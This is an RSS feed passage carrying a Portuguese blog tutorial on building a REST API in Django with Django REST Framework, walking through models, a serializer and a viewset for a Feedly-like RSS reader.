<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Klaus Laube - django]]></title><description><![CDATA[Python, Django e desenvolvimento Web]]></description><link>https://klauslaube.com.br</link><generator>RSS for Node</generator><lastBuildDate>Wed, 01 Jul 2020 20:25:36 GMT</lastBuildDate><author><![CDATA[Klaus Peter Laube]]></author><item><title><![CDATA[Construindo APIs em Django com Django REST Framework]]></title><description><![CDATA[No post anterior
tive a oportunidade de "destilar" a minha simpatia pelo Django REST Framework,
e de salientar alguns aspectos positivos da ferramenta. A praticidade
é sem dúvida um de seus pontos mais altos, e nesse post vamos explorá-la através
de código escrito (que vale mais do que mil palavras…]]></description><link>https://klauslaube.com.br/2020/02/13/construindo-apis-em-django-com-django-rest-framework.html</link><guid isPermaLink="false">https://klauslaube.com.br/2020/02/13/construindo-apis-em-django-com-django-rest-framework.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Thu, 13 Feb 2020 06:15:00 GMT</pubDate><content:encoded>&lt;p&gt;No &lt;a href=&quot;/2020/02/06/eu-me-rendo-django-rest-framework.html&quot; title=&quot;Leia o meu depoimento sobre a rendição ao DRF&quot;&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;
tive a oportunidade de &quot;destilar&quot; a minha simpatia pelo &lt;a href=&quot;/tag/drf.html&quot; title=&quot;Leia mais sobre o Django REST Framework&quot;&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;,
e de salientar alguns aspectos positivos da ferramenta. A praticidade
é sem dúvida um de seus pontos mais altos, e nesse &lt;em&gt;post&lt;/em&gt; vamos explorá-la através
de código escrito (que vale mais do que mil palavras).&lt;/p&gt;
&lt;h2&gt;Instalando&lt;/h2&gt;
&lt;p&gt;Sem mais delongas, o &lt;em&gt;REST Framework&lt;/em&gt; é facilmente instalado através dos comandos &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt; ou &lt;code class=&quot;language-text&quot;&gt;pipenv&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pipenv install djangorestframework&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não esqueça de adicionar a &lt;em&gt;app&lt;/em&gt; ao seu &lt;code class=&quot;language-text&quot;&gt;INSTALLED_APPS&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# settings.py&lt;/span&gt;

INSTALLED_APPS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;rest_framework&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Estamos prontos para mergulhar nos conceitos de &lt;em&gt;routers&lt;/em&gt;, serializadores e &lt;em&gt;views&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Antes de ir: O problema&lt;/h2&gt;
&lt;p&gt;Embora o &quot;iMDB-clone&quot; seja o meu tipo de exemplo favorito, dessa vez vamos imaginar que estamos desenvolvendo
um &quot;Feedly-clone&quot;. O &lt;a href=&quot;https://feedly.com/&quot; title=&quot;Visite o Feedly&quot;&gt;&lt;em&gt;Feedly&lt;/em&gt;&lt;/a&gt; é uma espécie de leitor &lt;a href=&quot;/2010/11/12/o-que-e-rss.html&quot; title=&quot;O que é RSS?&quot;&gt;&lt;em&gt;RSS&lt;/em&gt;&lt;/a&gt;
(com esteroides) muito popular.&lt;/p&gt;
&lt;p&gt;Vamos focar em dois tipos específicos: &lt;code class=&quot;language-text&quot;&gt;Channel&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;Item&lt;/code&gt;; &lt;em&gt;Channel&lt;/em&gt; é de fato o &lt;em&gt;website&lt;/em&gt; ou &lt;em&gt;blog&lt;/em&gt; que queremos registrar em
nossa plataforma. Esse é o mesmo nome utilizado pelo formato &lt;em&gt;RSS&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;xml&quot;&gt;&lt;pre class=&quot;language-xml&quot;&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;token prolog&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;rss&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;2.0&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;channel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;RSS Title&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;description&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;This is an example of an RSS feed&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;description&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;http://www.example.com/main.html&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;link&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;lastBuildDate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Mon, 06 Sep 2010 00:01:00 +0000 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;lastBuildDate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;pubDate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Sun, 06 Sep 2009 16:20:00 +0000&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;pubDate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;ttl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;1800&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;ttl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;

 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;item&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Example entry&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;description&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Here is some text containing an interesting description.&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;description&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;http://www.example.com/blog/post/1&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;link&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;guid&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;isPermaLink&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;false&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;7bd204c6-1655-4c27-aeee-53f933c5395f&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;guid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;pubDate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Sun, 06 Sep 2009 16:20:00 +0000&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;pubDate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;item&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;channel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;rss&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Já item, como ilustrado no exemplo acima, é de fato a notícia/artigo/música/podcast que aquele canal está publicando.&lt;/p&gt;
&lt;p&gt;Então, partiremos do princípio que os seguintes modelos já estão estabelecidos:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# channels/models.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;db &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; models


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Channel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    title &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    description &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TextField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;blank&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; null&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    link &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;URLField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;__str__&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;title


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    channel &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ForeignKey&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Channel&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; on_delete&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CASCADE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    title &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    description &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TextField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;blank&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; null&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    link &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;URLField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    pub_date &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DateTimeField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;__str__&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;title&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O próximo passo será definir a &lt;em&gt;API&lt;/em&gt; para que um possível cliente &lt;em&gt;mobile&lt;/em&gt; (por exemplo) a consuma.&lt;/p&gt;
&lt;h2&gt;Os serializadores&lt;/h2&gt;
&lt;p&gt;Segundo a &lt;a href=&quot;https://www.django-rest-framework.org/api-guide/serializers/&quot; title=&quot;Serializers&quot;&gt;documentação oficial&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Serializers allow complex data such as querysets and model instances to be converted to native Python datatypes that can then be easily rendered into JSON, XML or other content types. Serializers also provide deserialization, allowing parsed data to be converted back into complex types, after first validating the incoming data.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Eles funcionam como um espécie de &lt;code class=&quot;language-text&quot;&gt;Form&lt;/code&gt;, proporcionando ferramental para o &lt;em&gt;parsing&lt;/em&gt; e validação das requisições, bem como controlando o que será mandado como &lt;em&gt;output&lt;/em&gt; para o usuário. Dentro dessa analogia, o &lt;code class=&quot;language-text&quot;&gt;ModelSerializer&lt;/code&gt; faz mais ou menos o que o &lt;code class=&quot;language-text&quot;&gt;ModelForm&lt;/code&gt; faz. Logo, um bom candidato para começarmos a escrever o &lt;em&gt;endpoint&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# channels/serializers.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; rest_framework &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; serializers

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; channels&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;models &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Channel


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ChannelSerializer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;serializers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ModelSerializer&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Meta&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        model &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Channel
        fields &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;link&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Uma vez que estamos expondo todos os campos do modelo, é possível trocar a lista em &lt;code class=&quot;language-text&quot;&gt;fields&lt;/code&gt;, pela &lt;em&gt;string&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;__all__&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Viewsets&lt;/h2&gt;
&lt;p&gt;Continuando com as analogias, um &lt;em&gt;viewset&lt;/em&gt; seria mais ou menos o que são as &lt;em&gt;class-based views&lt;/em&gt; no &lt;em&gt;Django&lt;/em&gt;. Elas abstraem uma
porção de lógica repetitiva (como &lt;em&gt;CRUD&lt;/em&gt;) através de uma estrutura muito familiar aos que já possuem certa vivência com o &lt;em&gt;framework&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# channels/api.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; rest_framework &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; viewsets

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; channels&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;models &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Channel
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; channels&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;serializers &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; ChannelSerializer


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ChannelViewSet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;viewsets&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ModelViewSet&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    queryset &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Channel&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    serializer_class &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ChannelSerializer&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note que em &lt;code class=&quot;language-text&quot;&gt;queryset&lt;/code&gt; apontamos para o modelo &lt;code class=&quot;language-text&quot;&gt;Channel&lt;/code&gt;, e em &lt;code class=&quot;language-text&quot;&gt;serializer_class&lt;/code&gt; para a classe serializadora criada anteriormente.&lt;/p&gt;
&lt;h2&gt;Fazendo o roteamento&lt;/h2&gt;
&lt;p&gt;Como último passo para termos algo de fato visual, vamos mapear as rotas para o novo recurso criado.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 740px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/767c61c3f85f83779b4b72b19b2e65d7/07f3a/hyperdrive.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 42.1875%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAIABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMF/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAABw6BIH//EABcQAAMBAAAAAAAAAAAAAAAAAAACMQH/2gAIAQEAAQUCXSDX/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAFBABAAAAAAAAAAAAAAAAAAAAEP/aAAgBAQAGPwJ//8QAGBAAAwEBAAAAAAAAAAAAAAAAAAERMWH/2gAIAQEAAT8hgN0ump//2gAMAwEAAgADAAAAEIAP/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPxA//8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Qp//EAB0QAAIBBAMAAAAAAAAAAAAAAAERACExQVFhoeH/2gAIAQEAAT8QCjQLQOuZVSLP3qDaLBzP/9k=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Falcon em hyperdrive&quot;
        title=&quot;Usar DRF é como entrar em hyperdrive (pinpointe.com)&quot;
        src=&quot;/static/767c61c3f85f83779b4b72b19b2e65d7/07f3a/hyperdrive.jpg&quot;
        srcset=&quot;/static/767c61c3f85f83779b4b72b19b2e65d7/7809d/hyperdrive.jpg 192w,
